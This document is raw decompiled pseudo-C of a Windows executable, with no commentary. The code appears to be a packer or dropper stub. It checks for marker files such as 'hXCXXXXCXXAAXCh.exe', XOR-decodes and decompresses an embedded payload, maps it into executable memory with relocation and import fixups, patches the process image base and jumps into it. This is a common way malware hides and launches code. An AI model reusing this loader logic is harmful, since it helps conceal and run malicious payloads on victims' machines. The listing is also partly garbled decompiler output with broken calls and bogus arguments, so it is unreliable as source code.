int global11 = 0;
unsigned int global17 = 0;
__size32 global27 = 0;// 4 bytes
__size32 global59 = 0;// 4 bytes
unsigned int global67 = 0x4278;
__size32 global68 = 0x5600;// 4 bytes
__size32 global73 = 0;// 4 bytes
__size32 global76 = 0;// 4 bytes
__size32 global77 = 0;// 4 bytes
__size32 global78 = 0;// 4 bytes
int global80 = 0;

__size32 proc1(DWORD param1);
void proc2(unsigned int param1, int param2, unsigned int param3, unsigned int param4, unsigned int param5, unsigned char *param6, void *param7, unsigned int param8);
void proc3(__size32 param1);
void proc4(__size32 param1);
__size8 proc5(__size32 param1, __size32 param2, int param3);
__size32 proc6(HANDLE param1, char *param2);
void proc7(__size32 param1);
__size32 proc8(unsigned int *param1, unsigned char *param2);

// address: 0x4010e0
void _start(char param1, unsigned char param2, __size32 param3, __size32 param4, __size32 param5) {
    __size32 eax; 		// r24
    __size32 eax_1; 		// r24{18}
    int ecx; 		// r25
    int edx; 		// r26
    int esp; 		// r28
    __size32 *esp_1; 		// r28{116}
    __size32 *esp_2; 		// r28{147}
    __size32 *esp_3; 		// r28{251}
    __size32 *local10; 		// esp_3{251}
    unsigned int local6; 		// m[esp - 8]

    eax_1 = GetModuleHandleA();
    LoadIconA(0, 0x7f00);
    GetWindowsDirectoryA();
    ecx = (param2);
    if (ecx != 58) {
    }
    lstrcatA(&param1, "\hh.exe");
    eax = CreateFileA();
    if (eax != -1) {
        GetWindowsDirectoryA();
        edx = (param2);
        if (edx != 58) {
        }
        lstrcatA(&param1, "\hXCXXXXCXXAAXCh.exe");
        eax = CreateFileA(); /* Warning: also results in esp_1 */
        local10 = esp_1;
        if (eax == -1) {
            local6 = 0;
            esp_3 = local10;
            while (local6 < global67) {
                *(__size32*)(esp_3 - 4) = 0;
                esp_2 = GetModuleHandleA();
                local10 = esp_2;
                edx = local6 + 0x402333;
                eax = *(edx + 8);
                ecx = local6 + 0x402333;
                *(int*)(ecx + 8) = eax ^ 22;
                local6 += 8;
                esp_3 = local10;
            }
            *(__size32*)(esp_3 - 4) = global68;
            eax = proc1(*(esp_3 - 4));
            global73 = eax;
            *(unsigned int*)(esp_3 - 4) = global67;
            *(__size32*)(esp_3 - 8) = global73;
            *(__size32*)(esp_3 - 12) = 0x40233b;
            proc2(*(esp_3 - 184), *(esp_3 - 180), *(esp_3 - 48), *(esp_3 - 44), *(esp_3 - 32), *(esp_3 - 12), *(esp_3 - 8), *(esp_3 - 4));
            global76 = param5;
            global77 = param4;
            global78 = param3;
            ecx = *24;
            global27 = ecx;
            global80 = (esp - 4);
            *(__size32*)(esp_3 - 4) = eax_1;
            *(__size32*)(esp_3 - 8) = 0x40128f - eax_1;
            esp = proc3(*(esp_3 - 4));
            *(__size32*)(esp + 4) = global73;
            proc4(*(esp + 4));
/* goto m[0x406720]*/
        }
    } else {
    }
    return;
}

// address: 0x401730
__size32 proc1(DWORD param1) {
    __size32 eax; 		// r24

    eax = VirtualAlloc(0, param1, 0x3000, 4);
    return eax;
}

// address: 0x4018f0
void proc2(unsigned int param1, int param2, unsigned int param3, unsigned int param4, unsigned int param5, unsigned char *param6, void *param7, unsigned int param8) {
    unsigned char cl; 		// r9
    unsigned char cl_1; 		// r9{9}
    unsigned char dl; 		// r10
    unsigned char *eax; 		// r24
    unsigned int eax_1; 		// r24
    unsigned int eax_2; 		// r24{94}
    unsigned char *ecx; 		// r25
    unsigned char *edx; 		// r26
    int edx_1; 		// r26
    int esp; 		// r28
    unsigned int local0; 		// m[esp - 12]
    unsigned int local1; 		// m[esp - 160]
    union { void * x49; int x50; } local10; 		// param2{223}
    unsigned int local11; 		// param1{224}
    unsigned int local12; 		// local3{229}
    union { void * x49; int x50; } local13; 		// local4{231}
    unsigned int local14; 		// local5{232}
    unsigned int local15; 		// local3{235}
    union { void * x49; int x50; } local16; 		// local4{237}
    unsigned int local17; 		// local5{238}
    unsigned int local2; 		// m[esp - 24]
    unsigned int local3; 		// m[esp - 28]
    union { void * x49; int x50; } local4; 		// m[esp - 164]
    unsigned int local5; 		// m[esp - 168]
    unsigned int local9; 		// param4{221}

    local0 = 1;
    cl_1 = *param6;
    lstrcpyA();
    local9 = param4;
    local10 = param2;
    local11 = param1;
    local2 = 0;
    do {
        param4 = local9;
        param2 = local10;
        param1 = local11;
        eax = param6 + local0;
        cl = *eax;
        local0++;
        local12 = param4;
        local13 = param2;
        local14 = param1;
        local15 = param4;
        local16 = param2;
        local17 = param1;
        if ((cl) != (cl_1)) {
            ecx = param7 + local2;
            *(unsigned char*)ecx = cl;
            local2++;
        } else {
            edx = param6 + local0;
            eax_1 = *(unsigned char*)edx;
            if (eax_1 != 0) {
                edx = param6 + local0;
                eax_1 = proc8(&param5, edx);
                eax_2 = eax_1 + local0;
                ecx = param6 + eax_2;
                local1 = ecx;
                local4 = esp - 32;
                eax_1 = proc8(&param3, ecx);
                local13 = local4;
                local14 = local5;
                local0 = eax_1 + eax_2;
                local3 = 0;
                local12 = local3;
                while (local3 < param5) {
                    edx_1 = local2 - param3;
                    eax = param7 + local2;
                    dl = *(param7 + edx_1);
                    *(unsigned char*)eax = dl;
                    local2++;
                    local3++;
                    local12 = local3;
                }
            } else {
                ecx = param7 + local2;
                *(unsigned char*)ecx = cl_1;
                local2++;
                local0++;
            }
            local3 = local12;
            local4 = local13;
            local5 = local14;
            local15 = local3;
            local16 = local4;
            local17 = local5;
        }
        local3 = local15;
        local4 = local16;
        local5 = local17;
        local9 = local3;
        local10 = local4;
        local11 = local5;
    } while (local0 < param8);
    return;
}

// address: 0x401760
void proc3(__size32 param1) {
    __size32 eax; 		// r24
    __size32 ebp; 		// r29
    int ecx; 		// r25
    __size32 edx; 		// r26
    __size32 edx_1; 		// r26{14}
    __size32 esi; 		// r30
    int esp; 		// r28
    __size32 local10; 		// m[esp - 4]

    edx_1 = param1 + *(param1 + 60);
    eax = GetModuleHandleA();
    eax = GetProcAddress(eax, "kernel32.dll"); /* Warning: also results in edx */
    ecx = *(edx_1 + 80);
    (*eax)(pc, 0, ecx, 0x3000, 64, 0x4066b0, esi, param1, eax, edx_1, ebp, param1, edx_1, ecx, edx, esp - 4, esi, ADDFLAGS32(param1, *(param1 + 60), edx_1), ADDFLAGS32(param1, *(param1 + 60), edx_1), ADDFLAGS32(param1, *(param1 + 60), edx_1));
    global17 = eax;
    if (*0x406700 != 0) {
        edx = *(ebp - 16);
        eax = *(edx + 80);
        local10 = eax;
        ecx = *(ebp - 32);
        *(__size32*)(esp - 8) = ecx;
        edx = *0x406700;
        *(unsigned char **)(esp - 12) = edx;
        proc5(*(esp - 12), *(esp - 8), *(esp - 4));
        eax = global17 - *(ebp - 32);
        *(unsigned int*)(ebp - 24) = eax;
        ecx = *(ebp - 16);
        if (*(ecx + 164) != 0) {
            edx = *(ebp - 16);
            eax = *(ebp - 32);
            eax += *(edx + 160);
            *(unsigned int*)(ebp - 8) = eax;
            ecx = *(ebp - 8);
            while (*(ecx + 4) != 0) {
                edx = *(ebp - 8);
                eax = *(edx + 4);
                *(unsigned int*)(ebp - 12) = (eax - 8) / 2;
                ecx = *(ebp - 8);
                *(__size32*)(ebp - 28) = ecx + 8;
                *(__size32*)(ebp - 4) = 0;
L6:
                eax = *(ebp - 4);
                if (eax < *(ebp - 12)) {
                    ecx = *(ebp - 4);
                    edx = *(ebp - 28);
                    eax = *(unsigned short*)(edx + ecx * 2);
                    if ((int)eax >> 12 == 3) {
                        ecx = *(ebp - 8);
                        edx = global17 + *ecx;
                        eax = *(ebp - 4);
                        ecx = *(ebp - 28);
                        eax = *(unsigned short*)(ecx + eax * 2);
                        ecx = *(edx + (eax & 0xfff));
                        ecx += *(ebp - 24);
                        edx = *(ebp - 4);
                        eax = *(ebp - 28);
                        edx = *(unsigned short*)(eax + edx * 2);
                        eax = *(ebp - 8);
                        esi = global17 + *eax;
                        *(unsigned int*)(esi + (edx & 0xfff)) = ecx;
                    }
                    edx = *(ebp - 4);
                    *(__size32*)(ebp - 4) = edx + 1;
                    goto L6;
                }
                ecx = *(ebp - 8);
                edx = *(ebp - 8);
                edx += *(ecx + 4);
                *(__size32*)(ebp - 8) = edx;
                ecx = *(ebp - 8);
            }
        }
        edx = *(ebp + 8);
/* goto edx + global17*/
    }
    return;
}

// address: 0x4012f0
void proc4(__size32 param1) {
    __size8 cl; 		// r9
    __size32 eax; 		// r24
    int eax_1; 		// r24
    HANDLE eax_2; 		// r24{12}
    __size32 eax_3; 		// r24{244}
    __size32 eax_4; 		// r24{275}
    __size32 ebp; 		// r29
    int ecx; 		// r25
    __size32 *ecx_1; 		// r25
    __size32 ecx_2; 		// r25{199}
    __size32 ecx_3; 		// r25{245}
    int edx; 		// r26
    __size32 edx_1; 		// r26{133}
    __size32 edx_2; 		// r26{280}
    int esp; 		// r28
    void *esp_1; 		// r28{154}
    void *esp_2; 		// r28{267}
    void *esp_3; 		// r28{289}
    void *esp_4; 		// r28{418}
    void *esp_5; 		// r28{568}
    void *esp_6; 		// r28{586}
    HANDLE local0; 		// m[esp - 224]
    char *local1; 		// m[esp - 220]
    HANDLE local10; 		// m[esp - 264]
    char *local11; 		// m[esp - 260]
    unsigned int local12; 		// m[esp - 276]
    int local13; 		// m[esp - 272]
    __size32 local14; 		// m[esp - 268]
    int local15; 		// m[esp - 256]
    int local16; 		// m[esp - 248]
    int local17; 		// m[esp - 240]
    int local18; 		// m[esp - 232]
    int local19; 		// m[esp - 224]
    HANDLE local2; 		// m[esp - 232]
    int local20; 		// m[esp - 216]
    int local21; 		// m[esp - 212]
    int local22; 		// m[esp - 208]
    __size32 local23; 		// m[esp - 200]
    HANDLE local24; 		// m[esp - 196]
    __size32 local25; 		// m[esp - 72]
    __size32 local26; 		// m[esp - 68]
    __size32 local27; 		// m[esp - 64]
    __size32 local28; 		// m[esp - 48]
    __size32 local29; 		// m[esp - 40]
    char *local3; 		// m[esp - 228]
    __size32 local30; 		// m[esp - 24]
    __size32 local31; 		// m[esp - 20]
    __size32 local32; 		// m[esp - 8]
    __size32 local33; 		// m[esp - 4]
    __size32 local34; 		// m[esp + 4]
    int local35; 		// m[esp + 4]{656}
    unsigned int local36; 		// m[esp_4 - 8]{496}
    unsigned char *local37; 		// m[esp_4 - 8]{504}
    int local38; 		// m[esp - 4]{154}
    int local39; 		// m[esp - 8]{154}
    HANDLE local4; 		// m[esp - 240]
    int local40; 		// m[esp - 20]{154}
    int local41; 		// m[esp - 24]{154}
    int local42; 		// m[esp - 40]{154}
    int local43; 		// m[esp - 48]{154}
    int local44; 		// m[esp - 64]{154}
    int local45; 		// m[esp - 68]{154}
    int local46; 		// m[esp - 72]{154}
    int local47; 		// m[esp - 196]{154}
    int local48; 		// m[esp - 200]{154}
    int local49; 		// m[esp - 208]{154}
    char *local5; 		// m[esp - 236]
    int local50; 		// m[esp - 212]{154}
    int local51; 		// m[esp - 216]{154}
    int local52; 		// m[esp - 220]{154}
    int local53; 		// m[esp - 224]{154}
    int local54; 		// m[esp - 228]{154}
    int local55; 		// m[esp - 232]{154}
    int local56; 		// m[esp - 236]{154}
    int local57; 		// m[esp - 240]{154}
    int local58; 		// m[esp - 244]{154}
    int local59; 		// m[esp - 248]{154}
    HANDLE local6; 		// m[esp - 248]
    int local60; 		// m[esp - 252]{154}
    int local61; 		// m[esp - 256]{154}
    int local62; 		// m[esp - 260]{154}
    int local63; 		// m[esp - 264]{154}
    int local64; 		// m[esp - 268]{154}
    int local65; 		// m[esp - 272]{154}
    int local66; 		// m[esp - 276]{154}
    int local67; 		// m[esp - 188]
    void *local68; 		// esp_5{568}
    char *local7; 		// m[esp - 244]
    HANDLE local8; 		// m[esp - 256]
    char *local9; 		// m[esp - 252]

    eax_2 = GetModuleHandleA();
    lstrcpyA();
    eax = GetProcAddress(eax_2, "MapViewOfFileEx");
    lstrcpyA();
    eax = GetProcAddress(eax_2, "UnmapViewOfFile");
    lstrcpyA();
    eax = GetProcAddress(eax_2, "CreateFileMappingA");
    lstrcpyA();
    eax = GetProcAddress(eax_2, "VirtualAlloc");
    lstrcpyA();
    eax = GetProcAddress(eax_2, "LoadLibraryA");
    lstrcpyA();
    eax = GetProcAddress(eax_2, "VirtualFree");
    edx_1 = param1 + *(param1 + 60);
    ecx = *(unsigned short*)(edx_1 + 20);
    edx = *(edx_1 + 80);
    (*eax)(pc, 0, edx, 0x3000, 64, (esp - 188), 0x40668c, esp - 188, 0x40666c, esp - 188, 0x406648, esp - 188, 0x40662c, esp - 188, 0x406608, esp - 188, 0x4065e4, 0x4065d4, param1, eax_2, eax, edx_1, eax, edx_1 + ecx + 24, eax, eax, eax, eax, ebp, param1, edx_1 + ecx + 24, edx_1, edx, esp - 4, ADDFLAGS32(param1, *(param1 + 60), edx_1), ADDFLAGS32(param1, *(param1 + 60), edx_1), ADDFLAGS32(param1, *(param1 + 60), edx_1));
    *(__size32*)(ebp - 52) = eax;
    eax = *(ebp - 196);
    ecx = *(eax + 60);
    edx = *(ebp - 64);
    eax = *(unsigned short*)(edx + 6);
    *(__size32*)(esp_1 - 4) = ecx + eax * 40 + 312;
    edx = *(ebp + 8);
    *(unsigned char **)(esp_1 - 8) = edx;
    eax = *(ebp - 52);
    *(__size32*)(esp_1 - 12) = eax;
    cl = proc5(*(esp_1 - 12), *(esp_1 - 8), *(esp_1 - 4));
    *(__size32*)(ebp - 12) = 0;
    edx = *(ebp - 64);
    eax = *(unsigned short*)(edx + 6);
    while (*(ebp - 12) < eax) {
        ecx = *(ebp - 44);
        if (*(ecx + 20) != 0) {
            edx = *(ebp - 44);
            if (*(edx + 16) != 0) {
                eax = *(ebp - 44);
                ecx_2 = *(eax + 16);
                edx = *(ebp - 64);
                eax = *(edx + 60);
                ecx = *(ebp - 64);
                tmpl = (ecx_2 + eax - 1);
                tmp2 = *(ecx + 60);
                edx = *(ebp - 64);
                eax = *(edx + 60) * tmpl / tmp2;
                *(int*)(esp_1 - 4) = eax;
                eax = *(ebp - 44);
                ecx = *(ebp + 8);
                ecx += *(eax + 20);
                *(__size32*)(esp_1 - 8) = ecx;
                edx = *(ebp - 44);
                eax = *(ebp - 52);
                eax += *(edx + 12);
                *(__size32*)(esp_1 - 12) = eax;
                cl = proc5(*(esp_1 - 12), *(esp_1 - 8), *(esp_1 - 4));
            }
        }
        ecx = *(ebp - 44);
        *(__size32*)(ebp - 44) = ecx + 40;
        ecx = *(ebp - 12);
        *(__size32*)(ebp - 12) = ecx + 1;
        edx = *(ebp - 64);
        eax = *(unsigned short*)(edx + 6);
    }
    edx = *(ebp - 52);
    *(__size32*)(ebp - 196) = edx;
    eax_3 = *(ebp - 196);
    ecx_3 = *(ebp - 196);
    ecx = ecx_3 + *(eax_3 + 60);
    *(__size32*)(ebp - 64) = ecx;
    *(__size32*)(esp_1 - 4) = 0;
    edx = *(ebp - 64);
    eax = *(edx + 80);
    *(__size32*)(esp_1 - 8) = eax;
    *(__size32*)(esp_1 - 12) = 0;
    *(__size32*)(esp_1 - 16) = 4;
    *(__size32*)(esp_1 - 20) = 0;
    *(__size32*)(esp_1 - 24) = -1;
    (**(ebp - 4))(local66, local65, local64, local63, local62, local61, local60, local59, local58, local57, local56, local55, local54, local53, local52, local51, local50, local49, local48, local47, local46, local45, local44, local43, local42, local41, local40, local39, local38, local34, cl, eax, ecx, edx, ebp, <all>, ADDFLAGS32(ecx_3, *(eax_3 + 60), ecx), ADDFLAGS32(ecx_3, *(eax_3 + 60), ecx), ADDFLAGS32(ecx_3, *(eax_3 + 60), ecx));
    local68 = esp_2;
    *(__size32*)(ebp - 8) = eax;
    ecx = *(ebp - 64);
    edx = *(ebp - 52);
    edx += *(ecx + 128);
    *(__size32*)(ebp - 200) = edx;
    esp_5 = local68;
    eax_4 = *(ebp - 200);
    tmp1 = *(eax_4 + 16);
    while (*(eax_4 + 16) != 0) {
        ecx = *(ebp - 200);
        edx_2 = *(ebp - 52);
        edx = edx_2 + *(ecx + 12);
        *(__size32*)(esp_5 - 4) = edx;
        (**(ebp - 36))(local12, local13, local14, local10, local11, local8, local9, local6, local7, local4, local5, local2, local3, local0, local1, local20, local21, local22, local23, local24, local25, local26, local27, local28, local29, local30, local31, local32, local33, local35, cl, eax_4, ecx, edx, ebp, <all>, ADDFLAGS32(edx_2, *(ecx + 12), edx), ADDFLAGS32(edx_2, *(ecx + 12), edx), ADDFLAGS32(edx_2, *(ecx + 12), edx));
        *(__size32*)(ebp - 28) = eax;
        eax = *(ebp - 200);
        if (*eax == 0) {
            edx = *(ebp - 200);
            eax = *(ebp - 52);
            eax += *(edx + 16);
            *(__size32*)(ebp - 40) = eax;
            ecx = *(ebp - 200);
            edx = *(ebp - 52);
            edx += *ecx;
            *(__size32*)(ebp - 56) = edx;
        } else {
            ecx = *(ebp - 200);
            edx = *(ebp - 52);
            edx += *ecx;
            *(__size32*)(ebp - 40) = edx;
            eax = *(ebp - 200);
            ecx = *(ebp - 52);
            ecx += *(eax + 16);
            *(__size32 **)(ebp - 56) = ecx;
        }
        *(__size32*)(ebp - 24) = 0;
        eax = *(ebp - 200);
        if (*(eax + 16) != 0) {
            ecx = *(ebp - 200);
            if (*ecx != 0) {
                *(__size32*)(ebp - 24) = 1;
            }
        }
L25:
        esp_6 = esp_3;
        edx = *(ebp - 40);
        local68 = esp_6;
        if (*edx != 0) {
            eax = *(ebp - 40);
            ecx = *eax;
            if ((ecx & 0x80000000) == 0) {
                eax = *(ebp - 40);
                ecx = *eax;
                edx = *(ebp - 52);
                *(__size32*)(esp_3 - 4) = ecx + edx + 2;
                ecx = *(ebp - 28);
                *(__size32*)(esp_3 - 8) = ecx;
                eax = proc6(*(esp_3 - 8), *(esp_3 - 4));
                edx = *(ebp - 40);
                *(__size32 **)edx = eax;
            } else {
                edx = *(ebp - 40);
                eax = *edx;
                *(int*)(esp_3 - 4) = eax & 0x7fffffff;
                ecx = *(ebp - 28);
                *(__size32*)(esp_3 - 8) = ecx;
                eax = proc6(*(esp_3 - 8), *(esp_3 - 4));
                edx = *(ebp - 40);
                *(__size32 **)edx = eax;
            }
            if (*(ebp - 24) != 0) {
                eax = *(ebp - 56);
                ecx = *(ebp - 40);
                edx = *ecx;
                *(__size32*)eax = edx;
            }
            eax = *(ebp - 40);
            *(__size32*)(ebp - 40) = eax + 4;
            ecx = *(ebp - 56);
            *(__size32*)(ebp - 56) = ecx + 4;
            goto L25;
        }
        edx = *(ebp - 200);
        *(__size32*)(ebp - 200) = edx + 20;
        esp_5 = local68;
        eax_4 = *(ebp - 200);
        tmp1 = *(eax_4 + 16);
    }
    eax = *(ebp - 64);
    ecx = *(eax + 52);
    *(__size32*)(esp_5 - 4) = ecx;
    *(__size32*)(esp_5 - 8) = 0;
    *(__size32*)(esp_5 - 12) = 0;
    *(__size32*)(esp_5 - 16) = 0;
    *(__size32*)(esp_5 - 20) = 34;
    edx = *(ebp - 8);
    *(__size32*)(esp_5 - 24) = edx;
    (**(ebp - 20))(local12, local13, local14, local10, local11, local8, local9, local6, local7, local4, local5, local2, local3, local0, local1, local20, local21, local22, local23, local24, local25, local26, local27, local28, local29, local30, local31, local32, local33, local35, cl, eax, ecx, edx, ebp, <all>, SUBFLAGS32(*(eax_4 + 16), 0, tmp1), tmp1 == 0, *(eax_4 + 16) < 0);
    global17 = eax;
    if (*0x406700 != 0) {
L4:
        edx = *(ebp - 8);
        *(__size32*)(esp_4 - 4) = edx;
        CloseHandle(*(esp_4 - 4));
        eax = *(ebp - 64);
        ecx = *(eax + 80);
        *(__size32*)(esp_4 - 4) = ecx;
        edx = *(ebp - 52);
        local37 = edx;
        *(__size32*)(esp_4 - 12) = global17;
        proc5(*(esp_4 - 12), *(esp_4 - 8), *(esp_4 - 4));
        *(__size32*)(esp_4 - 4) = global17;
        proc7(*(esp_4 - 4));
        edx = *(ebp - 64);
        eax = global17 + *(edx + 40);
        global59 = eax;
        ecx = *(ebp - 64);
        *(__size32*)(ecx + 40) = global59;
    } else {
        eax = *(ebp - 64);
        ecx = *(eax + 52);
        *(__size32*)(esp_4 - 4) = ecx;
        eax = UnmapViewOfFile();
        if (eax != 0) {
L8:
            ecx = *(ebp - 64);
            edx = *(ecx + 52);
            *(__size32*)(esp_4 - 8) = edx;
            *(__size32*)(esp_4 - 12) = 0;
            *(__size32*)(esp_4 - 16) = 0;
            *(__size32*)(esp_4 - 20) = 0;
            *(__size32*)(esp_4 - 24) = 34;
            eax = *(ebp - 8);
            *(__size32*)(esp_4 - 28) = eax;
            eax = MapViewOfFileEx(); /* Warning: also results in esp_4 */
            global17 = eax;
            if (*0x406700 == 0) {
                *(__size32*)(esp_4 - 32) = 64;
                *(__size32*)(esp_4 - 36) = 0x3000;
                ecx = *(ebp - 64);
                edx = *(ecx + 80);
                *(__size32*)(esp_4 - 40) = edx;
                eax = *(ebp - 64);
                ecx = *(eax + 52);
                *(__size32*)(esp_4 - 44) = ecx;
                eax = VirtualAlloc(*(esp_4 - 44), *(esp_4 - 40), *(esp_4 - 36), *(esp_4 - 32)); /* Warning: also results in esp_4 */
                global17 = eax;
                goto L4;
            }
            goto L4;
        } else {
            *(__size32*)(esp_4 - 8) = 0x8000;
            *(__size32*)(esp_4 - 12) = 0;
            edx = *(ebp - 64);
            eax = *(edx + 52);
            *(__size32*)(esp_4 - 16) = eax;
            eax = VirtualFree(*(esp_4 - 16), *(esp_4 - 12), *(esp_4 - 8));
            if (eax != 0) {
                goto L8;
            } else {
            }
        }
    }
    return;
}

// address: 0x401040
__size8 proc5(__size32 param1, __size32 param2, int param3) {
    unsigned char cl; 		// r9
    unsigned char *eax; 		// r24
    unsigned char *edx; 		// r26

    global11 = 0;
    while (global11 < param3) {
        edx = param1 + global11;
        eax = param2 + global11;
        cl = *eax;
        *(unsigned char*)edx = cl;
        global11++;
    }
    return (unsigned char) global11;
}

// address: 0x4012d0
__size32 proc6(HANDLE param1, char *param2) {
    __size32 eax; 		// r24

    eax = GetProcAddress(param1, param2);
    return eax;
}

// address: 0x4018c0
void proc7(__size32 param1) {
    __size32 eax; 		// r24

    eax = *(global27 + 48);
    *(__size32*)(eax + 8) = param1;
    return;
}

// address: 0x401a10
__size32 proc8(unsigned int *param1, unsigned char *param2) {
    unsigned int edx; 		// r26
    unsigned int edx_1; 		// r26{19}
    unsigned int local0; 		// m[esp - 8]
    __size32 local1; 		// m[esp - 16]
    unsigned char *local2; 		// m[esp + 8]
    unsigned int local3; 		// m[esp - 20]
    unsigned char *local4; 		// param2{63}

    local0 = 0;
    local1 = 0;
    lstrcpyA();
    local4 = param2;
    do {
        param2 = local4;
        edx_1 = *(unsigned char*)param2;
        local2 = param2 + 1;
        local3 = local0 * 128;
        edx = edx_1 & 0x7f | local3;
        local0 = edx;
        local1++;
        local4 = local2;
    } while ((edx_1 & 0x80) != 0);
    *(unsigned int*)param1 = edx;
    return local1;
}

